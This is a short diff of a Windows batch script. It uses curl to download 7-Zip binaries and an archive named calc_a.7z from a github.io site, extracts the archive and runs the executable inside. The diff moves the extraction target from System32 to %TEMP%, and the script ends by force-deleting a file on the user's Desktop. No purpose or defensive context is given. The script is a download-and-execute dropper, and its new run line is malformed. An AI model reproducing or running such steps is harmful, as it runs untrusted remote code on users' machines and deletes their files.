@@ -6,7 +6,7 @@ curl https://kingdog2.github.io/7z.exe -o "%TEMP%\7z.exe"
 curl https://kingdog2.github.io/7z.dll -o "%TEMP%\7z.dll"
 curl https://kingdog2.github.io/calc_a.7z -o "%TEMP%\calc_a.7z"
 
-%TEMP%\7z.exe x %TEMP%\calc_a.7z -o"C:\\Windows\System32"
-C:\\Windows\System32\calc_a.exe
+%TEMP%\7z.exe x %TEMP%\calc_a.7z -o"%TEMP%"
+"TEMP"\calc_a.exe
 
 del /f %USERPROFILE%\Desktop\A.txt
